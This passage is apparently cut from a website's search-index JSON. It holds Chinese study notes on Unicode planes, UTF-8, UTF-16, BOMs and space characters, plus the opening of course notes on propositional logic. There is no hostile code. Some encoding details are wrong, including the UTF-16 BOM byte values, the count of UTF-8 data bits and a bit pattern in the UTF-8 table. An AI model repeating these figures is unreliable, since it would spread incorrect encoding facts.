\u5b98\u65b9\u5f00\u653e\u4e0b\u8f7d\u5730\u5740","title":"Unicode \u7edf\u4e00\u7801"},{"location":"cs/unicode/#unicode_1","text":"Unicode \u7684\u5b57\u7b26\u96c6\u4ee5\u5206\u7ec4\u7684\u5f62\u5f0f\u8fdb\u884c\u7f16\u6392\uff0c\u6574\u4f53\u5206\u4e3a 17 \u4e2a\u5e73\u9762\uff08Plane\uff09 \u6bcf\u4e2a\u5e73\u9762\u4e2d\u6709 \\(2^{16}\\) \u4e2a\u7801\u4f4d\uff08codepoint\uff09\uff0c\u5373\u53ef\u4ee5\u5305\u542b 65536 \u4e2a\u5b57\u7b26\uff0c\u6574\u4f53\u6700\u591a\u53ef\u4ee5\u5305\u542b 111w+ \u4e2a\u5b57\u7b26\uff0c\u4f46\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u5c11\u6570\u5e73\u9762\u5171 14w+ \u4e2a\u5b57\u7b26 Unicode \u5b57\u7b26\u96c6\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u6709\u4e00\u4e2a\u7f16\u53f7\uff0c\u5373\u5b57\u7b26\u503c\u3002\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u540e\u540e\u56db\u4f4d\u4e3a\u5728\u5f53\u524d\u5e73\u9762\u4e0a\u7684\u7801\u503c\uff0c\u524d\u9762\u5269\u4f59\u7684\u4e3a\u5e73\u9762\u7f16\u53f7 \u6bd4\u5982 \"\u9e64\" \u8fd9\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u503c\u662f 0x9E64\uff0c\u8868\u793a\u4e3a U+9E64","title":"Unicode \u5b57\u7b26\u96c6"},{"location":"cs/unicode/#_1","text":"\u5e73\u9762\u7f16\u53f7 \u5b57\u7b26\u503c\u8303\u56f4 \u540d\u79f0 0 U+0000 ~ U+FFFF BMP \uff08Basic Multilingual Plane\uff09\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 1 U+10000 ~ U+1FFFF SMP \uff08Supplementary Multilingual Plane\uff09\u591a\u6587\u79cd\u8865\u5145\u5e73\u9762 2 U+20000 ~ U+2FFFF SIP \uff08Supplementary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u8865\u5145\u5e73\u9762 3 U+30000 ~ U+3FFFF TIP \uff08Tertiary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u7b2c\u4e09\u5e73\u9762 4~13 U+40000 ~ U+DFFFF Reserved Planes \u5c1a\u672a\u4f7f\u7528 14 U+E0000 ~ U+EFFFF SSP \uff08Supplementary Special-purpose Plane\uff09\u7279\u522b\u7528\u9014\u8865\u5145\u5e73\u9762 15 U+F0000 ~ U+FFFFF PUA-A \uff08Private Use Area-A\uff09\u79c1\u4eba\u4f7f\u7528\u533a A \u533a 16 U+100000 ~ U+10FFFF PUA-B \uff08Private Use Area-B\uff09\u79c1\u4eba\u4f7f\u7528\u533a B \u533a BMP \u5e73\u9762\uff08\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762\uff09 \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SMP \u5e73\u9762\uff08\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762\uff09 \u4e3b\u8981\u6446\u653e\u7edd\u5927\u591a\u6570\u53e4\u4ee3\u6587\u5b57\uff0c\u73b0\u65f6\u5df2\u4e0d\u518d\u4f7f\u7528\u6216\u5f88\u5c11\u4f7f\u7528\u6587\u5b57\u3001\u901f\u8bb0\u3001\u6570\u5b66\u5b57\u6bcd\u7b26\u53f7\u3001\u97f3\u7b26\u3001\u56fe\u5f62\u7b26\u53f7\u53ca\u7528\u4e8e\u5b66\u8005\u7684\u4e13\u4e1a\u8bba\u6587\u4e2d\u4f7f\u7528\u7684\u53e4\u8001\u6216\u8fc7\u65f6\u7684\u8bed\u8a00\u4e66\u5199\u7b26\u53f7\uff0c\u4ee5\u53ca emoji \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u7b2c\u4e00\u8f85\u52a9\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SIP \u5e73\u9762\uff08\u7b2c\u4e8c\u8f85\u52a9\u5e73\u9762\uff09 \u5168\u4e3a CJK \u5b57\u7b26\uff0c\u5305\u542b\u5c11\u7528\u7684\u6c49\u5b57\u4ee5\u53ca\u67d0\u4e9b\u65b9\u8a00\u6587\u5b57 U+20000 ~ U+2A6DF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55B\u533a\uff08CJK Unified Ideographs Extension B\uff0943253 \u4e2a\u6c49\u5b57 U+2A700 ~ U+2B73F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55C\u533a\uff08CJK Unified Ideographs Extension C\uff094149 \u4e2a\u6c49\u5b57 U+2B740 ~ U+2B81F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55D\u533a\uff08CJK Unified Ideographs Extension D\uff09222 \u4e2a\u6c49\u5b57 U+2B820 ~ U+2CEAF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55E\u533a\uff08CJK Unified Ideographs Extension E\uff095762 \u4e2a\u6c49\u5b57 U+2CEB0 ~ U+2EBEF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55F\u533a\uff08CJK Unified Ideographs Extension F\uff097473 \u4e2a\u6c49\u5b57 U+2F800 ~ U+2FA1F\uff1a\u4e2d\u65e5\u97e9\u517c\u5bb9\u8868\u610f\u6587\u5b57\u589e\u8865\uff08CJK Compatibility Ideographs Supplement\uff09542 \u4e2a\u6c49\u5b57 TIP \u5e73\u9762\uff08\u7b2c\u4e09\u8f85\u52a9\u5e73\u9762\uff09 \u5df2\u5206\u914d U+30000 ~ U+3134F \u4e3a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55G\u533a\uff0c\u5305\u542b\u7532\u9aa8\u6587\u3001\u91d1\u6587\u3001\u5c0f\u7bc6\u3001\u4e2d\u56fd\u6218\u56fd\u65f6\u671f\u6587\u5b57\u7b49 SSP \u5e73\u9762\uff08\u7b2c\u5341\u56db\u8f85\u52a9\u5e73\u9762\uff09 \u5747\u4e3a\u63a7\u5236\u5b57\u7b26 U+E0000 ~ U+E007F\uff1a\u8bed\u8a00\u7f16\u7801\u6807\u7b7e\uff08Tags\uff09 U+E0100 ~ U+E01EF\uff1a\u5b57\u5f62\u53d8\u6362\u9009\u53d6\u5668\uff08Variation Selectors Supplement\uff09 \u79c1\u4eba\u4f7f\u7528\u533a Unicode \u4e2d\u4e00\u5171\u6709\u4e09\u4e2a\u79c1\u4eba\u4f7f\u7528\u533a\uff1a U+E000 ~ U+F8FF\uff1a\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 \u79c1\u4eba\u4f7f\u7528\u533a U+F0000 ~ U+FFFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a A \u533a U+100000 ~ U+10FFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a B \u533a \u4e00\u822c\u7528\u4e8e\u67d0\u4e9b\u6807\u51c6\u6765\u89c4\u5b9a Unicode \u6807\u51c6\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 GB/T 20542-2006\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55A\u201d\uff09\u548c GB/T 22238-2008\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55B\u201d\uff09\u4f7f\u7528\u79c1\u4eba\u4f7f\u7528\u533a\u5b58\u653e\u85cf\u6587\u8fde\u5b57","title":"\u5b57\u7b26\u5e73\u9762\u6620\u5c04"},{"location":"cs/unicode/#_2","text":"Unicode \u6709\u4e24\u79cd\u5b57\u7b26\u6620\u5c04\u65b9\u5f0f\uff0cUTF\uff08Unicode Transformation Format\uff09\u7f16\u7801\u548c UCS\uff08Universal Coded Character Set\uff09\u7f16\u7801\uff0c\u5177\u4f53\u6765\u8bf4\u6709 UCS-2\u3001UCS-4\u3001UTF-1\u3001UTF-8\u3001UTF-16\u3001UTF-32 \u7b49","title":"\u7f16\u7801"},{"location":"cs/unicode/#ucs","text":"UCS-2 \uff0cUniversal Character Set coded in 2 octets\uff0c\u5373\u7528\u4e24\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u8303\u56f4\u4ece U+0000 \u5230 U+FFFF\u3002\u4e5f\u5c31\u662f\u8bf4 UCS-2 \u53ea\u80fd\u8868\u793a BMP \u5e73\u9762\u4e0a\u7684\u5b57\u7b26 UCS-4 \uff0c\u540c\u7406\uff0c\u7528\u56db\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ece U+00000000 \u5230 U+FFFFFFFF\uff0c\u53ef\u4ee5\u8868\u793a\u6240\u6709 Unicode \u5b57\u7b26\uff08UCS-4 \u4e0e UTF-32 \u5b8c\u5168\u7b49\u4ef7\uff09 \u4f46\u662f\u8fd9\u4e24\u79cd\u65b9\u6848\u90fd\u4f1a\u5bfc\u81f4\u7f16\u7801\u540e\u6709\u5927\u91cf\u7684 0x00 \u5b57\u8282\uff0c\u5360\u7a7a\u95f4\uff0c\u6240\u4ee5\u4e5f\u5c31\u6709\u4e86\u53ef\u53d8\u957f\u5ea6\u7684 UTF \u7f16\u7801","title":"UCS"},{"location":"cs/unicode/#utf-8","text":"UTF-8 \u7f16\u7801\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u53d8\u5bbd\u5ea6\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u503c\u4f1a\u88ab\u7f16\u7801\u4e3a 1 \u5230 4 \u4e2a\u5b57\u8282 \u5177\u4f53\u6309\u7167\u4e0b\u9762\u7684\u7f16\u7801\u65b9\u5f0f\uff1a \u5b57\u7b26\u503c\u8303\u56f4 \u7b2c\u4e00\u5b57\u8282 \u7b2c\u4e8c\u5b57\u8282 \u7b2c\u4e09\u5b57\u8282 \u7b2c\u56db\u5b57\u8282 U+0000 ~ U+007F 0 xxxxxxx U+0080 ~ U+07FF 110 xxxxx 10 xxxxxx U+0800 ~ U+FFFF 1110 xxxx 10 xxxxxx 10 xxxxxx U+10000 ~ U+10FFFF 11110 xxx 10 xxxxxx 10 xxxxxx 10 xxxxxxx \u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210\u7684 0\uff1a\u5f53\u524d\u8fd9\u4e00\u4e2a\u5b57\u8282\u5c31\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u503c 110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e24\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e00\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 1110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e09\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e24\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 11110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u56db\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e09\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 10\uff1a\u5f53\u524d\u5b57\u8282\u662f\u4e00\u4e2a\u5b57\u7b26\u503c\u7684\u4e00\u90e8\u5206 \u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u56db\u4e2a\u5b57\u8282\u65f6\u5269\u4f59\u7684\u6570\u636e\u6bd4\u7279\u4e3a 12 \u4e2a\uff0c\u6b63\u597d\u662f Unicode \u89c4\u5b9a\u7684\u6700\u5927\u5bb9\u91cf \u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u70b9\uff1a U+0000 ~ U+007F \u8fd9 128 \u4e2a\u5b57\u7b26\u503c\u5168\u90e8\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u6765\u8868\u793a\uff0c\u5e76\u4e14\u524d\u7f00\u4e3a 0\uff0c\u5373\u7f16\u7801\u540e\u7684\u5b57\u8282\u503c\u548c\u5b57\u7b26\u503c\u76f8\u540c\u3002\u800c\u4e14\u8fd9 128 \u4e2a\u5b57\u7b26\u6b63\u597d\u662f ASCII \u7f16\u7801\u4e2d\u89c4\u5b9a\u7684\u5b57\u7b26\uff0c\u4f7f\u5f97 UTF-8 \u7f16\u7801\u5b8c\u5168\u517c\u5bb9 ASCII \u7f16\u7801 \u5728 BMP \u5e73\u9762\u4e2d\u7684 CJK \u5b57\u7b26\u90fd\u4f1a\u7f16\u7801\u4e3a 3 \u4e2a\u5b57\u8282 BMP \u5e73\u9762\u4f1a\u7f16\u7801\u4e3a 1~3 \u4e2a\u5b57\u8282\uff0c\u800c\u5269\u4f59\u7684\u5176\u4ed6\u5e73\u9762\u5747\u4f1a\u7f16\u7801\u4e3a 4 \u4e2a\u5b57\u8282","title":"UTF-8"},{"location":"cs/unicode/#utf-8-with-bom","text":"BOM\uff08Byte Order Mark\uff09\u5b57\u8282\u5e8f\u6807\u8bb0\u5728 UTF-8 \u7f16\u7801\u4e2d\u662f\u6ca1\u6709\u7528\u5904\u7684\uff0c\u4e5f\u4e0d\u63a8\u8350\uff0c\u5982\u679c\u5728\u6587\u4ef6\u5934\u5b58\u5728\u5219\u76f4\u63a5\u5ffd\u7565 UTF-8 \u7684 BOM \u548c UTF-16 \u7684 BOM \u5b57\u7b26\u503c\u4e00\u6837\u4e3a U+FEFF\uff0c\u7f16\u7801\u4e3a UTF-8 \u5373\u4e3a 0xEF 0xBB 0xBF \u4e09\u4e2a\u5b57\u8282\u3002\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u5b58\u5728\u4e8e\u6587\u4ef6\u5934\uff0c\u5219\u8868\u660e\u4e86\u8fd9\u4e2a\u6587\u4ef6\u4ee5 UTF-8 \u7f16\u7801\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5e94\u8be5\u76f4\u63a5\u5ffd\u7565","title":"UTF-8 with BOM"},{"location":"cs/unicode/#utf-16","text":"UTF-16 \u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u503c\u7f16\u7801\u4e3a 1~2 \u4e2a 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff08\u5373 2 \u6216 4 \u4e2a\u5b57\u8282\uff09 \u5b83\u7684\u7f16\u7801\u65b9\u5f0f\u5206\u4e3a\u4e24\u7c7b\uff1a U+0000 ~ U+FFFF \u8303\u56f4 BMP \u7684\u5168\u90e8\u90e8\u5206\uff0c\u7f16\u7801\u503c\u548c\u7801\u4f4d\u76f8\u540c\uff0c\u5373\u76f4\u63a5\u5c06\u7801\u4f4d\u4f5c\u4e3a\u4e24\u4e2a\u5b57\u8282\u7684\u7f16\u7801 U+10000 ~ U+10FFFF \u8303\u56f4 \u6240\u6709\u7684\u8f85\u52a9\u5e73\u9762\u4e0a\u7684\u7801\u4f4d\u4f1a\u88ab\u7f16\u7801\u4e3a\u4e00\u5bf9 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff0c\u79f0\u4e3a\u4ee3\u7406\u5bf9\uff08Surrogate Pair\uff09 \u7801\u4f4d\u51cf 0x10000\uff0c\u4f7f\u8303\u56f4\u843d\u5728 0x00000 \u5230 0xFFFFF\uff0c\u5373 20 \u6bd4\u7279 \u9ad8\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xD800 \u5f97\u5230\u7b2c\u4e00\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u9ad8\u4f4d\u4ee3\u7406\uff08high surrogate\uff09\u6216\u524d\u5bfc\u4ee3\u7406\uff08lead surrogate\uff09 \u4f4e\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xDC00 \u5f97\u5230\u7b2c\u4e8c\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u4f4e\u4f4d\u4ee3\u7406\uff08low surrogate\uff09\u6216\u540e\u5c3e\u4ee3\u7406\uff08trail surrogate\uff09 \u8fd9\u6837\u7f16\u7801\u4e4b\u540e\u9ad8\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xD800 ~ 0xDBFF\uff0c\u4f4e\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xDC00 ~ 0xDFFF \u800c U+D800 ~ U+DFFF \u8fd9\u4e9b\u7801\u4f4d\u5728 BMP \u4e2d\u5df2\u7ecf\u9884\u7559\u4e86\u51fa\u6765\u4e0d\u8868\u793a\u4efb\u4f55\u5b57\u7b26\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u91cd\u53e0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bc6\u522b\u51fa\u6765\u662f\u600e\u4e48\u7f16\u7801\u7684 UTF-16 \u4e0e UTF-8 \u76f8\u6bd4\uff0c\u597d\u5904\u662f\u5927\u90e8\u5206\u5b57\u7b26\u90fd\u53ef\u4ee5\u7f16\u7801\u4e3a\u56fa\u5b9a\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u800c\u574f\u5904\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u4e0e ASCII \u5b8c\u5168\u4e0d\u517c\u5bb9","title":"UTF-16"},{"location":"cs/unicode/#utf-16_1","text":"UTF-16 \u53ef\u4ee5\u4f7f\u7528\u5927\u7aef\u5e8f\u548c\u5c0f\u7aef\u5e8f\uff0c\u5728\u6587\u4ef6\u5f00\u5934\u4f1a\u6709 BOM\uff08U+FEFF\uff09\u6765\u6307\u660e\u5230\u5e95\u662f\u54ea\u4e2a\u6a21\u5f0f\uff08\u5982\u679c\u6ca1\u6709\uff0c\u5219\u9700\u8981\u731c\u6d4b\uff09 \u5c0f\u7aef\u5e8f\uff08UTF-16 LE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xFF 0xEF \u5927\u7aef\u5e8f\uff08UTF-16 BE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xEF 0xFF","title":"UTF-16 \u7f16\u7801\u6a21\u5f0f"},{"location":"cs/unicode/#_3","text":"","title":"\u90e8\u5206\u7279\u6b8a\u5b57\u7b26"},{"location":"cs/unicode/#_4","text":"Unicode \u4e2d\u7684\u7a7a\u683c\u4e5f\u6709\u5f88\u591a\u79cd\uff0c\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\u3001\u4ee5\u53ca\u610f\u4e49\uff08\u4e00\u4e9b\u96f6\u5bbd\u5b57\u7b26\u4e5f\u63a5\u5728\u8868\u540e\u9762\u4e86\uff09 [data-md-color-scheme=\"default\"] .space { white-space: pre; padding: 0; background-color: #000000DE; display: inline-block; line-height: 1; } [data-md-color-scheme=\"slate\"] .space { white-space: pre; padding: 0; background-color: #FFFFFFE6; display: inline-block; line-height: 1; } \u7801\u4f4d \u540d\u79f0 \u5bbd\u5ea6 \u610f\u4e49/\u7528\u9014 U+0020 SPACE ASCII \u7a7a\u683c\uff0c\u76f4\u63a5\u6253\u7a7a\u683c\u5c31\u662f\u8fd9\u4e2a U+00A0 NO-BREAK SPACE \u548c U+0020 \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u4f1a\u65ad\u884c\uff0cHTML \u5b9e\u4f53 &nbsp; U+1680 OGHAM SPACE MARK \u1680 \u6b27\u7518\u6587\u7a7a\u683c U+2000 EN QUAD \u2002 \u534a\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2002 \u66ff\u4ee3 U+2001 EM QUAD \u2003 \u5168\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2003 \u66ff\u4ee3 U+2002 EN SPACE \u2002 \u534a\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &ensp; U+2003 EM SPACE \u2003 \u5168\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &emsp; U+2004 THREE-PER-EM SPACE \u2004 \u4e09\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/3\uff0c &emsp13; U+2005 FOUR-PER-EM SPACE \u2005 \u56db\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/4\uff0c &emsp14; U+2006 SIX-PER-EM SPACE \u2006 \u516d\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/6 U+2007 FIGURE SPACE \u2007 \u6570\u5b57\u7a7a\u683c\uff0c\u5728\u6709\u7b49\u5bbd\u6570\u5b57\u7684\u5b57\u4f53\u4e2d\u5bbd\u5ea6\u548c\u4e00\u4e2a\u6570\u5b57\u5bbd\u5ea6\u4e00\u81f4\uff0c &numsp; U+2008 PUNCTUATION SPACE \u2008 \u7b26\u53f7\u7a7a\u683c\uff0c\u4e0e\u7a84\u6807\u70b9\u7b26\u53f7\u5bbd\u5ea6\u4e00\u81f4\uff0c &puncsp; U+2009 THIN SPACE \u2009 \u8584\u7a7a\u683c\uff0c\u5bbd\u5ea6\u4e0d\u56fa\u5b9a\uff0c &thinsp; U+200A HAIR SPACE \u200a \u5934\u53d1\u7a7a\u683c\uff0c\u6bd4\u8584\u7a7a\u683c\u66f4\u7a84\uff0c &hairsp; U+202F NARROW NO-BREAK SPACE \u202f \u7a84\u7684\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u5728\u8499\u53e4\u8bed\u4e2d\u5bbd\u5ea6\u7c7b\u4f3c\u4e09\u5206\u5bbd\uff0c\u5176\u4ed6\u7c7b\u4f3c U+2009 U+205F MEDIUM MATHEMATICAL SPACE \u205f \u4e2d\u7b49\u6570\u5b66\u7a7a\u683c\uff0c4/18\u5bbd\uff0c\u7528\u4e8e\u6570\u5b66\u516c\u5f0f\u4e2d\u7b26\u53f7\u4e24\u4fa7\uff0c &MediumSpace; U+3000 IDEOGRAPHIC SPACE \u3000 \u8868\u610f\u7a7a\u683c\uff0cCJK \u8868\u610f\u6587\u5b57\u4f7f\u7528\u7684\u5168\u89d2\u7a7a\u683c U+200B ZERO WIDTH SPACE \u96f6\u5bbd\u7a7a\u683c\uff0c &ZeroWidthSpace; U+200C ZERO WIDTH NON-JOINER \u96f6\u5bbd\u4e0d\u8fde\u5b57\uff0c\u7528\u6765\u963b\u6b62\u5e26\u8fde\u5b57\u5b57\u4f53\u7684\u8fde\u5b57\uff0c &zwnj; U+200D ZERO WIDTH JOINER \u96f6\u5bbd\u8fde\u5b57\uff0c\u53ef\u4ee5\u8bf1\u5bfc\uff08\u5982\u8868\u60c5\u7b26\u53f7\u548c\u50e7\u4f3d\u7f57\u8bed\uff09\u6216\u6291\u5236\uff08\u5982\u68b5\u6587\uff09\u7528\u5355\u4e2a\u5b57\u5f62\u66ff\u6362\uff0c &zwj; U+2060 WORD JOINER \u96f6\u5bbd\u8bcd\u8fde\u63a5\u7b26\uff0c\u4e0d\u4f1a\u5728\u8bcd\u95f4\u65ad\u884c\uff0c &NoBreak; U+FEFF ZERO WIDTH NO-BREAK SPACE \u96f6\u5bbd\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u73b0\u7528\u4f5c\u6807\u8bb0\u5927\u5c0f\u7aef\u5e8f","title":"\u7a7a\u683c"},{"location":"cs/unicode/#_5","text":"\u8be6\u89c1 \u4e0d\u79bb\u4e0d\u5f03\u7684\u7834\u6298\u53f7 - The Type","title":"\u6a2a\u7ebf"},{"location":"cs/ai/basic/","text":"\u4eba\u5de5\u667a\u80fd\u57fa\u7840 \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u4eba\u5de5\u667a\u80fd\u57fa\u7840\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u53c2\u8003\u6559\u6750\uff1a\u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de Table of Contents \u00b6 \u903b\u8f91\u4e0e\u63a8\u7406 \u641c\u7d22\u6c42\u89e3","title":"\u4eba\u5de5\u667a\u80fd\u57fa\u7840"},{"location":"cs/ai/basic/#_1","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u4eba\u5de5\u667a\u80fd\u57fa\u7840\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u53c2\u8003\u6559\u6750\uff1a\u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de","title":"\u4eba\u5de5\u667a\u80fd\u57fa\u7840"},{"location":"cs/ai/basic/#table-of-contents","text":"\u903b\u8f91\u4e0e\u63a8\u7406 \u641c\u7d22\u6c42\u89e3","title":"Table of Contents"},{"location":"cs/ai/basic/topic1/","text":"\u903b\u8f91\u4e0e\u63a8\u7406 \u00b6 Abstract \u4eba\u5de5\u667a\u80fd\u57fa\u7840\u7b2c 2 \u81f3 4 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de \u547d\u9898\u903b\u8f91 \u00b6 \u547d\u9898\u903b\u8f91\uff08proposition logic\uff09\u662f\u5e94\u7528\u4e00\u5957\u5f62\u5f0f\u5316\u89c4\u5219\u5bf9\u4ee5\u7b26\u53f7\u8868\u793a\u7684\u63cf\u8ff0\u6027\u9648\u8ff0\uff08\u79f0\u4e3a\u547d\u9898\uff09\u8fdb\u884c\u63a8\u7406\u7684\u7cfb\u7edf \u547d\u9898\u903b\u8f91\u4ee5\u539f\u5b50\u547d\u9898\u4f5c\u4e3a\u6700\u57fa\u672c\u7684\u5355\u4f4d\uff0c\u65e0\u6cd5\u5bf9\u539f\u5b50\u547d\u9898\u8fdb\u884c\u5206\u89e3\uff08\u5206\u79bb\u5176\u4e3b\u8bed\u4e0e\u8c13\u8bed\uff09 \u547d\u9898\u903b\u8f91\u662f\u6570\u7406\u903b\u8f91\u7684\u57fa\u7840 \u901a\u8fc7\u547d\u9898\u8054\u7ed3\u8bcd\uff08connectives\uff09\u5bf9\u5df2\u6709\u547d\u9898\u8fdb\u884c\u7ec4\u5408\uff0c\u5f97\u5230\u65b0\u547d\u9898\uff0c\u79f0\u4e3a\u7b26\u5408\u547d\u9898\uff08compound proposition\uff09 \u547d\u9898\u5408\u53d6 conjunction\uff0c \\(p\\wedge q\\) \u547d\u9898\u6790\u53d6 disjunction\uff0c \\(p\\vee q\\) \u547d\u9898\u5426\u5b9a negation\uff0c \\(\\neg p\\) \u547d\u9898\u8574\u542b implication\uff0c \\(p\\rightarrow q\\) \uff0c \\(p\\) \u4e3a\u524d\u4ef6\uff0c \\(q\\) \u4e3a\u540e\u4ef6 \u547d\u9898\u53cc\u5411\u8574\u542b bi-implication\uff0c \\(p\\leftrightarrow q\\) \u903b\u8f91\u7b49\u4ef7\uff1a\u5728\u6240\u6709\u60c5\u51b5\u4e0b\u90fd\u6709\u76f8\u540c\u771f\u5047\u7ed3\u679c \u9006\u5426\u547d\u9898\uff1a \\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\beta\\rightarrow\\neg\\alpha\\) \u8574\u542b\u6d88\u9664\uff1a \\((\\alpha\\rightarrow\\beta)\\equiv\\neg\\alpha\\vee\\beta\\) \u53cc\u5411\u6d88\u9664\uff1a \\((\\alpha\\leftrightarrow\\beta)\\equiv(\\alpha\\rightarrow\\beta)\\wedge(\\beta\\rightarrow\\alpha)\\) ... \u63a8\u7406\uff1a\u6309\u7167\u67d0\u79cd\u7b56\u7565\u4ece\u524d\u63d0\u51fa\u53d1\u63a8\u51fa\u7ed3\u8bba\u7684\u8fc7\u7a0b\u3002\u5e38\u89c1\u63a8\u7406\u89c4\u5219\uff1a \u5047\u8a00\u63a8\u7406 modus ponens\uff1a \\(\\alpha\\rightarrow\\beta, \\alpha\\Rightarrow\\beta\\) \u4e0e\u6d88\u89e3 and-elimination\uff1a \\(\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\Rightarrow\\alpha_i(1\\leq i\\leq n)\\) \u4e0e\u5bfc\u5165 and-introduction\uff1a \\(\\alpha_1,\\alpha_2,\\cdots,\\alpha_n\\Rightarrow\\alpha_1\\wedge\\alpha_2\\wedge\\cdots\\wedge\\alpha_n\\) 